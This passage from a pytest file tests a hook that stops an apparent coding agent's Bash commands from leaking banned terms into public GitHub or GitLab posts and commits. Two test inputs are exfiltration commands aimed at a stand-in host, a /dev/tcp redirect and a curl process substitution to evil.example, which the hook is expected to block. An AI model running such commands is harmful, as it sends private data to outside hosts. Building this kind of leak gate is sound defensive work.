        _git(repo, "init", "-b", "main")
        _git(repo, "remote", "add", "origin", "https://github.com/some/public.git")
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        monkeypatch.chdir(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git -C {repo} commit -F does_not_exist.txt"},
            "cwd": str(tmp_path),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_commit_bodyfile_genuinely_missing_on_unknown_repo_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415 task #62: the SAME genuinely-missing ``-F`` path landing in an
        # UNKNOWN-visibility repo (probe unavailable, not allowlisted) now
        # DOWNGRADES -- a commit is LOCAL, the gate cannot READ the body, and the
        # pre-push public-leak gate re-scans commit messages before they reach a
        # public remote. Previously this hard-blocked, forcing ALLOW_BANNED_TERM=1
        # on an ordinary commit whose repo the in-hook probe could not classify.
        repo = tmp_path / "unk"
        repo.mkdir()
        _git(repo, "init", "-b", "main")
        _git(repo, "remote", "add", "origin", "https://github.com/some/unknown.git")
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f"git -C {repo} commit -F does_not_exist.txt"},
            "cwd": str(tmp_path),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""

    def test_public_repo_commit_with_banned_term_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = tmp_path / "pub"
        repo.mkdir()
        _git(repo, "init", "-b", "main")
        _git(repo, "remote", "add", "origin", "https://github.com/some/public.git")
        # No allowlist hit; the visibility probe finds nothing → unknown →
        # NOT private → hard-block stands.
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "ship to acmecorp"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_private_repo_posting_command_with_cwd_target_allowed(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # gh issue create (no --repo flag) from a private CWD resolves the
        # target from the CWD origin; the allowlisted-private destination is
        # skipped by the destination gate (#1672) -- allowed, no deny.
        repo = _private_repo(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'gh issue create --title t --body "ship to acmecorp"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_posting_command_with_explicit_public_repo_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # An explicit --repo pointing at a PUBLIC repo must never be carved out
        # regardless of what the CWD is. This is the load-bearing safety test.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'gh pr create --repo souliane/teatree --title t --body "ship to acmecorp"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_public_repo_commit_with_cd_prefixed_override_is_allowed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The escape hatch behind the common cd-prefixed shape: even on a PUBLIC
        # repo the operator's explicit ALLOW_BANNED_TERM=1 must bypass the gate,
        # exactly as the leading form already does. Before the fix the override
        # on the second segment was dropped and the commit hard-blocked.
        repo = tmp_path / "pub"
        repo.mkdir()
        _git(repo, "init", "-b", "main")
        _git(repo, "remote", "add", "origin", "https://github.com/some/public.git")
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f'cd {repo} && ALLOW_BANNED_TERM=1 git commit -m "ship to acmecorp"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_slug_for_cwd_resolves_offline_when_git_binary_is_absent(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The cold hook subprocess can inherit a restricted PATH where ``git``
        # does not resolve. The slug must STILL resolve -- parsed OFFLINE from
        # ``.git/config`` -- so the offline ``private_repos`` allowlist gets a
        # slug to match and the user's OWN private post is not over-blocked.
        # Before the fix the bare ``git remote get-url`` raised
        # FileNotFoundError and the slug was empty, which over-blocked it.
        repo = _private_repo(tmp_path)
        monkeypatch.setenv("PATH", "")  # mimic the restricted hook subprocess: no git
        assert _repo_visibility.slug_for_cwd(repo) == "gitlab.com/acmecorp-engineering/product"

    def test_slug_for_cwd_fails_safe_for_non_repo_cwd_without_git(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A genuinely non-repo cwd has no ``.git/config`` to parse and ``git``
        # is absent, so the slug fails SAFE to an empty string -- a detection
        # failure never weakens the gate.
        monkeypatch.setenv("PATH", "")
        assert _repo_visibility.slug_for_cwd(tmp_path) == ""

    def test_private_repo_commit_downgrades_when_probe_binary_is_absent(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The offline allowlist is the mechanism that exists precisely because the
        # live gh/glab visibility probe is unreliable in-hook (restricted PATH).
        # With the probe disabled, the slug still resolves from git and the
        # allowlist alone must downgrade the private repo's own-domain commit.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "fix the acmecorp refinery"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn via the offline allowlist
        assert capsys.readouterr().out == ""

    def test_private_repo_commit_with_cd_prefixed_override_is_allowed(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The exact reported shape: cd into the private worktree, then commit
        # with the override. The override leads the SECOND (publish) segment, so
        # it must bypass the gate just like the leading form does.
        repo = _private_repo(tmp_path)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": f'cd {repo} && ALLOW_BANNED_TERM=1 git commit -m "ship to acmecorp"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False
        assert capsys.readouterr().out == ""


# #1415 (still-over-blocking residue): a ``git commit`` whose effective first
# action is NOT the literal first word -- it sits behind a NON-``cd`` leading
# segment (a ``cat > <bodyfile> <<EOF … EOF`` heredoc-writer, the agent's
# standard body-file idiom; or any ``true &&`` / setup preamble) -- was
# mis-classified. ``is_git_commit_command`` only skips a leading ``cd``/``pushd``
# prefix, so a heredoc-writer or ``&&``-chained preamble made it return False and
# BOTH carve-out dispatch sites (the real-banned-term ``carve_out_applies`` and
# the unreadable-body ``command_targets_private_only``) fell through to
# ``command_is_pure_private_gh_glab_post``, which returns False for a commit. The
# allowlisted-private commit then HARD-BLOCKED even though it lands in private
# history. The per-segment proof in ``commit_branch_downgrades`` still preserves
# the genuine block (a chained PUBLIC post defeats the downgrade), so the fix is
# to recognise a ``git commit`` segment regardless of leading benign segments.
class TestGitCommitSegmentBehindNonCdPrefix:
    def test_heredoc_bodyfile_private_commit_with_banned_term_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The agent's standard idiom: write the commit body to a file via a
        # heredoc, then ``git -C <worktree> commit -F <bodyfile>`` -- ONE Bash
        # command. The heredoc-writer ``cat > <bodyfile> <<EOF`` is the leading
        # segment, so the commit is not the first word. The body carries the
        # private repo's own domain word and lands in the allowlisted-private
        # worktree, so it must DOWNGRADE, not hard-block.
        repo = _private_repo(tmp_path)
        body = repo / "COMMIT_MSG.txt"
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f"cat > {body} <<'EOF'\nfix the acmecorp refinery\nEOF\ngit -C {repo} commit -F {body}"
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_heredoc_bodyfile_public_commit_with_banned_term_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY guard: the SAME heredoc-bodyfile shape landing in a PUBLIC
        # repo must STILL hard-block. Recognising the commit segment behind the
        # heredoc prefix must not weaken the public-surface protection.
        repo = _public_repo(tmp_path)
        body = repo / "COMMIT_MSG.txt"
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f"cat > {body} <<'EOF'\nship to acmecorp\nEOF\ngit -C {repo} commit -F {body}"
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_prefix_segment_private_commit_unreadable_body_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The reported production shape distilled: a ``git -C <worktree> commit
        # -F <bodyfile>`` whose body is UNREADABLE at scan time (the marker
        # fires), sitting behind a non-``cd`` leading segment. The commit lands
        # in the allowlisted-private worktree, so the unread body cannot leak and
        # it must DOWNGRADE, not hard-block with "publish body could not be read".
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_prefix_segment_provably_public_commit_unreadable_body_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415: the SAME unreadable-body shape behind a leading segment landing in
        # a PROBE-CONFIRMED-PUBLIC repo now DOWNGRADES. A ``git commit`` is LOCAL
        # regardless of the landing repo's visibility, and the pre-push gate (#703)
        # re-scans commit messages before a public push -- so the commit-time gate
        # must not hard-block an ordinary commit merely because its body is
        # unreadable at scan time. The anti-vacuity guard is the chained-PUBLIC-post
        # case (still blocks, below) and the readable-term case.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        monkeypatch.chdir(tmp_path)
        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_prefix_segment_public_commit_chained_to_public_post_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY guard for the public-commit downgrade above: the LOCAL-commit
        # widening (#1415) is gated by the chained-segment proof, so a commit whose
        # body is unreadable but that is CHAINED to a real PUBLIC ``gh`` post in the
        # same command must STILL hard-block -- the public post is the genuine
        # public action with no push gate behind it, and the secret/term in the
        # post body leaks the moment the command runs.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        monkeypatch.chdir(tmp_path)
        cmd = (
            f"git -C {repo} commit -F does_not_exist.txt "
            f'&& gh issue create --repo souliane/teatree --title x --body "ship to acmecorp"'
        )
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_prefix_segment_unknown_repo_commit_unreadable_body_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415 task #62: the SAME unreadable-body shape behind a leading segment
        # landing in an UNKNOWN-visibility repo now DOWNGRADES. The commit is
        # local; the pre-push gate re-scans commit messages before a public push.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f"true && git -C {repo} commit -F does_not_exist.txt"
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""

    def test_private_commit_chained_public_gh_post_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # LOAD-BEARING safety guard: recognising a commit segment behind a leading
        # segment must NOT relax a chained PUBLIC post. A private commit chained to
        # a ``gh issue create --repo <PUBLIC>`` carrying the same body still leaks,
        # so the per-segment proof must keep the hard-block.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        post = "gh issue create --repo souliane/teatree --title t --body acmecorp"
        cmd = f'git -C {repo} commit -m "acmecorp work" && {post}'
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_private_commit_chained_public_gh_api_raw_rest_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # SHARED-CHOKEPOINT hole (mirror of the quote-gate fix): a private commit
        # chained to a RAW-REST ``gh api`` POST must STILL hard-block. ``gh api``
        # carries its target in the URL PATH (no ``--repo``), so the chained-segment
        # proof's target resolver falls back to the commit CWD; with the CWD the
        # private repo, the public POST is wrongly accepted as private and the term
        # in its body leaks. The proof must reject any chained raw-REST segment.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        post = "gh api repos/souliane/teatree/issues -X POST -f body=acmecorp"
        cmd = f'git commit -m "feat: ship faster builds" && {post}'
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(repo)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_private_commit_chained_network_redirect_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # LOAD-BEARING safety guard for the local-redirect relaxation: only a LOCAL
        # file write is benign. A redirect to a network pseudo-device
        # (``> /dev/tcp/host/port``) exfiltrates the body, so even on the private
        # repo the segment is NOT publish-inert and the command must hard-block.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f'git -C {repo} commit -m "acmecorp work" && echo acmecorp > /dev/tcp/evil.example/80'
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_private_commit_chained_process_substitution_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # LOAD-BEARING safety guard: a process-substitution redirect target
        # (``> >(curl …)``) runs a second unverifiable command and must keep the
        # hard-block -- the substitution-marker check fires before the local-file
        # relaxation is reached.
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        cmd = f'git -C {repo} commit -m "acmecorp work" && echo acmecorp > >(curl https://evil.example)'
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"


def _unknown_repo(tmp_path: Path) -> Path:
    # A repo with a resolvable origin slug that is NEITHER allowlisted-private NOR
    # probe-confirmed (the steady state for most local checkouts: the in-hook
    # gh/glab visibility probe runs in a restricted PATH and cannot confirm).
    repo = tmp_path / "unknown-repo"
    repo.mkdir()
    _git(repo, "init", "-b", "main")
    _git(repo, "remote", "add", "origin", "git@gitlab.com:my-company/my-product.git")
    return repo


# #1415: a NORMAL ``git commit -m`` whose inline message merely MENTIONS a
# ``$(...)`` snippet (``feat: support $(date) output``) is held in full by the
# gate as literal argv text, but ``resolve_inline_body_value`` fail-closes on any
# live ``$(...)`` because for a PUBLIC ``gh``/``glab`` --body it cannot predict
# the expansion. A ``git commit`` is LOCAL, not a public surface, and the
# dedicated pre-push gate (refuse-public-push-with-leak.sh, #703) re-scans commit
# messages before they reach a public remote -- so the unreadable-body marker
# must DOWNGRADE on EVERY local commit regardless of the landing repo's visibility
# (private, allowlisted, unknown, OR provably-public), while every gh/glab POST
# stays hard-blocked. Before the fix every ordinary commit hard-blocked, forcing
# ALLOW_BANNED_TERM=1 on it -- the over-block that stuck multiple coders.
class TestNormalCommitWithDollarParenMessage:
    def test_unknown_repo_commit_mentioning_dollar_paren_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # THE reported bug: a clean commit message that describes a ``$(date)``
        # snippet on a repo whose visibility is UNKNOWN (not allowlisted, probe
        # unavailable) must no longer hard-block -- the commit lands in local
        # history and the push gate is the real public-leak chokepoint.
        repo = _unknown_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "feat: support $(date) output"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_unknown_repo_commit_mentioning_cat_subst_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # Same shape with a ``$(cat)`` mention -- the other common false-positive.
        repo = _unknown_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "refactor: use the $(cat) helper"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_private_repo_commit_mentioning_dollar_paren_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The task-named case: an allowlisted-private repo commit with a ``$(...)``
        # mention downgrades (parity with the existing private-repo carve-out).
        repo = _private_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "chore: stamp build with $(date)"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False
        assert capsys.readouterr().out == ""

    def test_public_repo_commit_mentioning_dollar_paren_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # #1415: a commit landing in a PROVABLY-public repo (the user's own public
        # clone) now DOWNGRADES on an unreadable body too -- a ``git commit`` is
        # LOCAL and the pre-push gate (#703) is the real public-leak chokepoint, so
        # an ordinary commit whose message merely mentions a ``$(...)`` snippet must
        # not hard-block. The commit-scoped anti-vacuity guard is the gh/glab POST
        # below (still blocks); the readable-term commit guards block too.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "feat: support $(date) output"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is False  # downgraded to warn, not denied
        assert capsys.readouterr().out == ""  # no deny JSON on stdout

    def test_unknown_repo_gh_post_with_live_subst_body_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY guard: the downgrade is COMMIT-scoped. A gh/glab PUBLIC post
        # whose --body carries a live ``$(...)`` the gate cannot read is the real
        # public action (no push gate behind it) and must STILL hard-block.
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        blocked = handle_banned_terms_pretool(
            _bash('gh pr create --repo someone/public --title t --body "see $(cat notes.md)"')
        )
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_unknown_repo_commit_chained_public_gh_post_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # LOAD-BEARING safety guard: relaxing the unknown-repo commit must not
        # relax a chained PUBLIC post in the SAME command. The per-segment proof
        # keeps the hard-block when a non-inert public post rides along.
        repo = _unknown_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        monkeypatch.chdir(tmp_path)
        post = 'gh issue create --repo souliane/teatree --title t --body "see $(cat x.md)"'
        cmd = f'git -C {repo} commit -m "feat: support $(date) output" && {post}'
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_unknown_repo_commit_with_real_banned_term_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY guard: the downgrade is for UNREADABLE bodies only. A
        # SCANNABLE real banned term in an unknown-visibility commit still
        # hard-blocks -- the gate can see the leak and the commit may be pushed
        # public, so the real-term path is untouched by this fix.
        repo = _unknown_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: None)
        data = {
            "tool_name": "Bash",
            "tool_input": {"command": 'git commit -m "ship the acmecorp build"'},
            "cwd": str(repo),
        }
        blocked = handle_banned_terms_pretool(data)
        assert blocked is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"


class TestGitCommitStdinBodyResolution:
    """``git commit -F -`` stdin / heredoc / piped bodies are RESOLVED and scanned (#1415).

    The over-block that stuck multiple coders mid-commit: a clean ``git commit
    -F -`` heredoc or ``printf … | git commit -F -`` to the user's own PUBLIC
    clone hard-blocked merely because the body was unreadable as a file named
    ``-`` at scan time. The fix resolves the in-command stdin body (heredoc /
    piped ``printf``/``echo`` writer) so a CLEAN message PASSES and a REAL banned
    term in that same readable body still BLOCKS -- the resolution never weakens
    the scan. A genuinely-OPAQUE stdin (``cat file | git commit -F -``) is a LOCAL
    commit and downgrades to warn (the pre-push gate re-scans before a public push).
    """

    def _run(self, command: str, cwd: Path) -> bool:
        return handle_banned_terms_pretool({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(cwd)})

    def test_heredoc_stdin_clean_commit_to_public_passes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # USED-TO-FALSE-BLOCK, now PASSES: a clean ``git commit -F - <<EOF`` to a
        # PROVABLY-PUBLIC repo. The heredoc body is read and scanned clean.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "git commit -F - <<'EOF'\nfix(gate): resolve stdin bodies cleanly\nEOF"
        assert self._run(cmd, repo) is False
        assert capsys.readouterr().out == ""  # clean: no deny JSON

    def test_heredoc_stdin_banned_term_to_public_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY: a REAL banned term in the SAME readable heredoc body still
        # hard-blocks -- resolution feeds the real body to the scanner, so the leak
        # is caught. The fix removes the false-block, never the true-block.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "git commit -F - <<'EOF'\nfix: ship to acmecorp this sprint\nEOF"
        assert self._run(cmd, repo) is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_piped_printf_clean_commit_to_public_passes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        assert self._run("printf '%s' 'fix: a perfectly clean commit message' | git commit -F -", repo) is False
        assert capsys.readouterr().out == ""

    def test_piped_printf_banned_term_to_public_still_blocks(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY: the piped writer's body is scanned, so a banned term in it
        # still blocks.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        assert self._run("printf '%s' 'ship to acmecorp right now' | git commit -F -", repo) is True
        assert json.loads(capsys.readouterr().out)["permissionDecision"] == "deny"

    def test_opaque_stdin_commit_to_public_downgrades(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # A genuinely-opaque stdin (no heredoc, no printf/echo writer) is a LOCAL
        # commit whose body the gate cannot read -- it downgrades, not blocks.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        assert self._run("cat COMMIT_MSG.txt | git commit -F -", repo) is False
        assert capsys.readouterr().out == ""


class TestGhGlabStdinBodyResolution:
    """``gh``/``glab --body-file -`` stdin heredoc / piped bodies are RESOLVED and scanned (#1415).

    The over-block this fixes: a ``gh pr create --body-file - <<EOF … EOF`` (or
    ``glab mr note … --body-file -``) whose body is fed on stdin hard-blocked with
    the "body file is missing or unresolvable" message — the ``-`` was read as an
    unreadable file named ``-`` and the fail-closed sentinel preempted the scan,
    even though the heredoc/piped body is fully present at scan time. Only ``git
    commit -F -`` resolved its stdin body; gh/glab did not. The fix resolves the
    in-command stdin body so a CLEAN post PASSES and a REAL banned term in that
    same readable body BLOCKS with the banned-term reason (not the unresolvable
    one) — the resolution ADDS coverage, never weakens it. A genuinely-OPAQUE
    stdin (``cat file | gh pr create --body-file -``) is a PUBLIC post the gate
    cannot read, so it stays hard-blocked (unlike a LOCAL git commit, which
    downgrades).
    """

    def _deny(self, command: str, cwd: Path, capsys: pytest.CaptureFixture[str]) -> str | None:
        event = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(cwd)}
        blocked = handle_banned_terms_pretool(event)
        out = capsys.readouterr().out
        return json.loads(out)["permissionDecisionReason"] if blocked else None

    def test_gh_heredoc_stdin_clean_body_passes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # USED-TO-FALSE-BLOCK ("body file is missing or unresolvable"), now PASSES:
        # the heredoc body IS present at scan time and scans clean.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "gh pr create --title t --body-file - <<'EOF'\nclean pr body about shipping\nEOF"
        assert self._deny(cmd, repo, capsys) is None

    def test_gh_heredoc_stdin_banned_term_blocks_as_banned_not_unresolvable(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # ANTI-VACUITY: a REAL banned term in the SAME readable heredoc body blocks
        # with the BANNED-TERM reason. Before the fix it blocked with the WRONG
        # "could not be read" reason (the sentinel preempted the scan) — asserting
        # the reason distinguishes the added coverage from the old fail-closed.
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "gh pr create --title t --body-file - <<'EOF'\nrolling out acmecorp integration\nEOF"
        reason = self._deny(cmd, repo, capsys)
        assert reason is not None
        assert "banned term 'acmecorp'" in reason
        assert "could not be read" not in reason

    def test_glab_note_heredoc_stdin_clean_body_passes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        repo = _public_repo(tmp_path)
        monkeypatch.setattr(_repo_visibility, "probe_visibility", lambda _slug: "PUBLIC")
        cmd = "glab mr note 1 --body-file - <<'EOF'\nclean review note here\nEOF"
        assert self._deny(cmd, repo, capsys) is None

    def test_piped_printf_gh_clean_body_passes(
